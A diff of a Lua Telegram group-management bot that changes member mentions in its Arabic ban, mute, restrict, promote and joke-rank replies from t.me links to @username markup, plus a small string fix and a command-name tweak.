 local  statuss  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n*🙋🏻‍♂╿اهــلا عزيزي\n🎫│تم رفع العضو داخل قلبك✔️\n🛠╽تمت ترقيته بنجاح 😻??👋🏻*'
 send(msg.chat_id_, msg.id_, usertext..statuss)
 end,nil)
@@ -5371,7 +5374,7 @@ end
 function start_function(extra, result, success)
 database:srem(bot_id..'Qlbi:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n*🙋🏻‍♂╿اهــلا عزيزي\n🎫│تم تنزيله من داخل قلبك✔️\n🛠╽تمت ازالته من قائمة القلوب 😹💔*'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -5418,7 +5421,7 @@ end
 function start_function(extra, result, success)
 database:sadd(bot_id..'Zwgi:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 local  statuss  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n*🙋🏻‍♂╿اهــلا عزيزتي\n🎫│تم زواجكم الاثنين بنجاح✔️\n🛠╽الآن يمكنكم أخذ راحتكم🤤😉*'
 send(msg.chat_id_, msg.id_, usertext..statuss)
 end,nil)
@@ -5440,7 +5443,7 @@ end
 function start_function(extra, result, success)
 database:srem(bot_id..'Zwgi:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n*🙋🏻‍♂╿اهــلا عزيزتي\n🎫│تم تنزيل التبن زوجك بنجاح✔️\nالآن انتم مفترقان☹️💔*'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -5487,7 +5490,7 @@ end
 function start_function(extra, result, success)
 database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 local  statuss  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n*⚡| تم رفع العضو زاحف\nكمشتك حبي جيب رقم*'
 send(msg.chat_id_, msg.id_, usertext..statuss)
 end,nil)
@@ -5509,7 +5512,7 @@ end
 function start_function(extra, result, success)
 database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n*⚡| تم تنزيل العضو زاحف\n هاك حبي هاذا رقم لاس*'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -5556,7 +5559,7 @@ end
 function start_function(extra, result, success)
 database:sadd(bot_id..'Djajh:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » [@"..username.."]'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 local  statuss  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n⚡| تم رفع العضو دجاجه\n لاوصيـك اهم شي الـبـيـض 😂'
 send(msg.chat_id_, msg.id_, usertext..statuss)
 end,nil)
@@ -5578,7 +5581,7 @@ end
 function start_function(extra, result, success)
 database:srem(bot_id..'Djajh:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n*⚡| تم تنزيل العضو دجاجه\n اكلنا البيض عليـك😂*'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -5640,7 +5643,7 @@ return false
 end
 database:sadd(bot_id..'Ban:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n🔘| تم حظره من المجموعه'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -5727,7 +5730,7 @@ database:sadd(bot_id..'Ban:User'..msg.chat_id_, userid)
 chat_kick(msg.chat_id_, userid)  
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n*🔘| تم حظره من المجموعه*'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -5756,7 +5759,7 @@ return false
 end
 database:srem(bot_id..'Ban:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n*🔘| تم الغاء حظره من هنا*'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -5816,7 +5819,7 @@ database:srem(bot_id..'Ban:User'..msg.chat_id_, userid)
 tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n*🔘| تم الغاء حظره من هنا*'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -5872,7 +5875,7 @@ return false
 end
 database:sadd(bot_id..'Muted:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤|العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤|العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n??| الايدي » `'..result.sender_user_id_..'`\n*🔘| تم كتمه وداعا رح افتقد خواطرك 💔*'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -5944,7 +5947,7 @@ if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
 send(msg.chat_id_, msg.id_, "\n🔰| عذرا لا تستطيع طرد او حظر او كتم او تقييد ( "..Rutba(result.sender_user_id_,msg.chat_id_).." )")
 else
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n☑| تم كتم لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}\n🔘| تم كتمه وداعا رح افتقد خواطرك 💔*'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -6018,7 +6021,7 @@ end
 database:sadd(bot_id..'Muted:User'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n🔘| تم كتمه وداعا رح افتقد خواطرك 💔'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -6042,7 +6045,7 @@ end
 function start_function(extra, result, success)
 database:srem(bot_id..'Muted:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n🔘| تم الغاء كتمه يلا حبي سولف '
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -6090,7 +6093,7 @@ end
 database:srem(bot_id..'Muted:User'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n🔘| تم الغاء كتمه يلا حبي سولف '
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -6121,7 +6124,7 @@ send(msg.chat_id_, msg.id_, '\n⚠| عذرا لا تستطيع طرد او حظ�
 else
 https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n🔘| تم تقييدك هنا يالثرثار '
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -6192,7 +6195,7 @@ if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
 send(msg.chat_id_, msg.id_, "\n🔰| عذرا لا تستطيع طرد او حظر او كتم او تقييد ( "..Rutba(result.sender_user_id_,msg.chat_id_).." )")
 else
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n☑| تم تقييده لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'} \n🔘| تم تقييدك هنا يالثرثار'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -6263,7 +6266,7 @@ else
 https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n🔘| تم تقييدك هنا يالثرثار '
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -6288,7 +6291,7 @@ end
 function start_function(extra, result, success)
 https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n🔘| تم الغاء تقييده يلا ارجع سولف'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -6337,7 +6340,7 @@ end
 https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n🔘| تم الغاء تقييده يلا ارجع سولف'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -6401,7 +6404,7 @@ database:srem(bot_id..'Ban:User'..msg.chat_id_,result.sender_user_id_)
 database:srem(bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_)
 database:srem(bot_id..'Gmute:User'..msg.chat_id_,result.id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n🔘| تم الغاء القيود عنه'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -6409,7 +6412,7 @@ else
 database:srem(bot_id..'Ban:User'..msg.chat_id_,result.sender_user_id_)
 database:srem(bot_id..'Muted:User'..msg.chat_id_,result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n??| تم الغاء القيود عنه'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -6503,7 +6506,7 @@ send(msg.chat_id_, msg.id_,'🚸| البوت ليس ادمن يرجى ترقيت
 return false  
 end
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n🔘| تم رفعه مشرف بالقروب '
 send(msg.chat_id_, msg.id_, usertext..status)
 https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
@@ -6543,7 +6546,7 @@ send(msg.chat_id_, msg.id_,'🚸| البوت ليس ادمن يرجى ترقيت
 return false  
 end
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n🔘| تم تنزيله مشرف من القروب'
 send(msg.chat_id_, msg.id_, usertext..status)
 https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
@@ -6585,7 +6588,7 @@ send(msg.chat_id_, msg.id_,'🚸| البوت ليس ادمن يرجى ترقيت
 return false  
 end
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n🔘| تم رفعه ادمن بالقروب بكل الصلاحيات'
 send(msg.chat_id_, msg.id_, usertext..status)
 https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
@@ -6625,7 +6628,7 @@ send(msg.chat_id_, msg.id_,'🚸| البوت ليس ادمن يرجى ترقيت
 return false  
 end
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n📮| الايدي » `'..result.sender_user_id_..'`\n🔘| تم تنزيله ادمن من القروب بكل الصلاحيات'
 send(msg.chat_id_, msg.id_, usertext..status)
 https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
@@ -7753,19 +7756,19 @@ function by_reply(extra, result, success)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..RTPA..msg.chat_id_)
 if blakrt == 'مميز' and Mod(msg) then
-send(msg.chat_id_, msg.id_,'\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'..'\n🔘| تم رفعه '..RTPA..' هنا\n')   
+send(msg.chat_id_, msg.id_,'\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'..'\n🔘| تم رفعه '..RTPA..' هنا\n')   
 database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA) 
 database:sadd(bot_id..'Special:User'..msg.chat_id_,result.sender_user_id_)  
 elseif blakrt == 'ادمن' and Manager(msg) then 
-send(msg.chat_id_, msg.id_,'\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'..'\n🔘| تم رفعه '..RTPA..' هنا\n')   
+send(msg.chat_id_, msg.id_,'\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'..'\n🔘| تم رفعه '..RTPA..' هنا\n')   
 database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA)
 database:sadd(bot_id..'Mod:User'..msg.chat_id_,result.sender_user_id_)  
 elseif blakrt == 'مدير' and Constructor(msg) then
-send(msg.chat_id_, msg.id_,'\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'..'\n🔘| تم رفعه '..RTPA..' هنا\n')   
+send(msg.chat_id_, msg.id_,'\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'..'\n🔘| تم رفعه '..RTPA..' هنا\n')   
 database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA)  
 database:sadd(bot_id..'Manager'..msg.chat_id_,result.sender_user_id_)  
 elseif blakrt == 'عضو' and Mod(msg) then
-send(msg.chat_id_, msg.id_,'\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'..'\n🔘| تم رفعه '..RTPA..' هنا\n')   
+send(msg.chat_id_, msg.id_,'\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'..'\n🔘| تم رفعه '..RTPA..' هنا\n')   
 end
 end,nil)   
 end   
@@ -7788,19 +7791,19 @@ function by_reply(extra, result, success)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
 local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..RTPA..msg.chat_id_)
 if blakrt == 'مميز' and Mod(msg) then
-send(msg.chat_id_, msg.id_,'\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'..'\n🔘| تم تنزيله من '..RTPA..' هنا\n')   
+send(msg.chat_id_, msg.id_,'\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'..'\n🔘| تم تنزيله من '..RTPA..' هنا\n')   
 database:srem(bot_id..'Special:User'..msg.chat_id_,result.sender_user_id_)  
 database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
 elseif blakrt == 'ادمن' and Manager(msg) then 
-send(msg.chat_id_, msg.id_,'\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'..'\n🔘| تم تنزيله من '..RTPA..' هنا\n')   
+send(msg.chat_id_, msg.id_,'\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'..'\n🔘| تم تنزيله من '..RTPA..' هنا\n')   
 database:srem(bot_id..'Mod:User'..msg.chat_id_,result.sender_user_id_) 
 database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
 elseif blakrt == 'مدير' and Constructor(msg) then
-send(msg.chat_id_, msg.id_,'\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'..'\n🔘| تم تنزيله من '..RTPA..' هنا\n')   
+send(msg.chat_id_, msg.id_,'\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'..'\n🔘| تم تنزيله من '..RTPA..' هنا\n')   
 database:srem(bot_id..'Manager'..msg.chat_id_,result.sender_user_id_)  
 database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
 elseif blakrt == 'عضو' and Mod(msg) then
-send(msg.chat_id_, msg.id_,'\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'..'\n🔘| تم تنزيله من '..RTPA..' هنا\n')   
+send(msg.chat_id_, msg.id_,'\n👤| العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'..'\n🔘| تم تنزيله من '..RTPA..' هنا\n')   
 end
 end,nil)   
 end   
@@ -7936,7 +7939,7 @@ return false
 end
 database:sadd(bot_id..'VVVZVV:MN:TF'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n ▫️⁝ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n ▫️⁝ العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n ▫️⁝ تم ترقيته منظف'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -7995,7 +7998,7 @@ end
 database:sadd(bot_id..'VVVZVV:MN:TF'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n ▫️⁝ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n ▫️⁝ العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n ▫️⁝ تم ترقيته منظف'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -8018,7 +8021,7 @@ end
 function start_function(extra, result, success)
 database:srem(bot_id..'VVVZVV:MN:TF'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n ▫️⁝ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n ▫️⁝ العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n ▫️⁝ تم تنزيله من المنظفيه'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -8065,7 +8068,7 @@ end
 database:srem(bot_id..'VVVZVV:MN:TF'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n ▫️⁝ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n ▫️⁝ العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n ▫️⁝ تم تنزيله من المنظفيه'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -8129,7 +8132,7 @@ return false
 end
 database:sadd(bot_id..'WZ:EE:R'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n ▫️⁝ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n ▫️⁝ العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n ▫️⁝ تم ترقيته وزير'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -8188,7 +8191,7 @@ end
 database:sadd(bot_id..'WZ:EE:R'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n ▫️⁝ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n ▫️⁝ العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n ▫️⁝ تم ترقيته وزير'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -8211,7 +8214,7 @@ end
 function start_function(extra, result, success)
 database:srem(bot_id..'WZ:EE:R'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
-usertext = '\n ▫️⁝ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n ▫️⁝ العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n ▫️⁝ تم تنزيله من الوزراء'
 send(msg.chat_id_, msg.id_, usertext..status)
 end,nil)
@@ -8258,7 +8261,7 @@ end
 database:srem(bot_id..'WZ:EE:R'..msg.chat_id_, userid)
 tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
 if data.first_name_ then
-usertext = '\n ▫️⁝ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'ASTORHBOTS')..')'
+usertext = '\n ▫️⁝ العضو » ['..data.first_name_..'](@'..(data.username_ or 'ASTORHBOTS')..')'
 status  = '\n ▫️⁝ تم تنزيله من الوزراء'
 send(msg.chat_id_, msg.id_, usertext..status)
 else
@@ -8312,7 +8315,7 @@ Text = '\n💠| بالتاكيد تم تفعيل التواصل '
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل التونممماصل' and SudoBot(msg) then  
+if text == 'تعطيل التواصصل' and SudoBot(msg) then  
 if not database:get(bot_id..'Tuasl:Bots') then
 database:set(bot_id..'Tuasl:Bots',true) 
 Text = '\n📞| تم تعطيل التواصل' 
@@ -9779,7 +9782,7 @@ else
 if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
